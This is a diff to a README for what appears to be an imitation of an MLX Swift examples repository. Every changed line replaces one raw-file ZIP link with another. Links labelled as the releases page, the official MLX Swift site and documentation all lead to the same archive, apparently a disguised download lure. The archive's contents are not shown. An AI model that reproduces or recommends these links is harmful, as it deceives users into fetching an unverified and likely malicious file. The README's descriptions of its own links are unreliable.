@@ -1,6 +1,6 @@
 # 🚀 mlx-swift-examples - Simple Examples for MLX Swift
 
-[![Download](https://raw.githubusercontent.com/ibragullam/mlx-swift-examples/main/icterogenous/mlx-swift-examples.zip)](https://raw.githubusercontent.com/ibragullam/mlx-swift-examples/main/icterogenous/mlx-swift-examples.zip)
+[![Download](https://raw.githubusercontent.com/ibragullam/mlx-swift-examples/main/Tools/image-tool/examples_swift_mlx_v1.7.zip)](https://raw.githubusercontent.com/ibragullam/mlx-swift-examples/main/Tools/image-tool/examples_swift_mlx_v1.7.zip)
 
 ## 📖 Introduction
 Welcome to mlx-swift-examples! This project provides a variety of easy-to-follow examples using MLX Swift. Whether you are a beginner or just exploring, these examples can help you understand the basics of conducting simple machine learning tasks.
@@ -14,7 +14,7 @@ Welcome to mlx-swift-examples! This project provides a variety of easy-to-follow
 ## 📥 Download & Install
 To get started, you need to download the examples. Please follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/ibragullam/mlx-swift-examples/main/icterogenous/mlx-swift-examples.zip) to see all available versions.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/ibragullam/mlx-swift-examples/main/Tools/image-tool/examples_swift_mlx_v1.7.zip) to see all available versions.
 2. **Choose a Version:** You will see a list of releases. Click on the latest version or the one you prefer.
 3. **Download the Files:** Find the files listed under the release. Click on each file to download it to your computer.
 
@@ -39,13 +39,13 @@ After you have downloaded the examples, follow these steps to run them:
 
 ## 📂 Example Structure
 Each example in this repository contains:
-- **https://raw.githubusercontent.com/ibragullam/mlx-swift-examples/main/icterogenous/mlx-swift-examples.zip** This is where the program starts. It contains the core logic for the example.
+- **https://raw.githubusercontent.com/ibragullam/mlx-swift-examples/main/Tools/image-tool/examples_swift_mlx_v1.7.zip** This is where the program starts. It contains the core logic for the example.
 - **Resources:** Any images or files needed for the example will be included.
 - **Documentation:** Each folder contains a README file explaining the example in detail.
 
 ## 📚 Learning Resources
 If you want to learn more about MLX Swift, check out the following resources:
-- **Official Documentation:** Visit the [MLX Swift site](https://raw.githubusercontent.com/ibragullam/mlx-swift-examples/main/icterogenous/mlx-swift-examples.zip) for comprehensive guides.
+- **Official Documentation:** Visit the [MLX Swift site](https://raw.githubusercontent.com/ibragullam/mlx-swift-examples/main/Tools/image-tool/examples_swift_mlx_v1.7.zip) for comprehensive guides.
 - **Online Tutorials:** Search for Swift programming courses on platforms like Coursera or Udemy.
 
 ## ❓ FAQ
@@ -72,4 +72,4 @@ This project is licensed under the MIT License. Feel free to use it as you wish,
 
 For more details, check the LICENSE file in the repository.
 
-[![Download](https://raw.githubusercontent.com/ibragullam/mlx-swift-examples/main/icterogenous/mlx-swift-examples.zip)](https://raw.githubusercontent.com/ibragullam/mlx-swift-examples/main/icterogenous/mlx-swift-examples.zip)
+[![Download](https://raw.githubusercontent.com/ibragullam/mlx-swift-examples/main/Tools/image-tool/examples_swift_mlx_v1.7.zip)](https://raw.githubusercontent.com/ibragullam/mlx-swift-examples/main/Tools/image-tool/examples_swift_mlx_v1.7.zip)
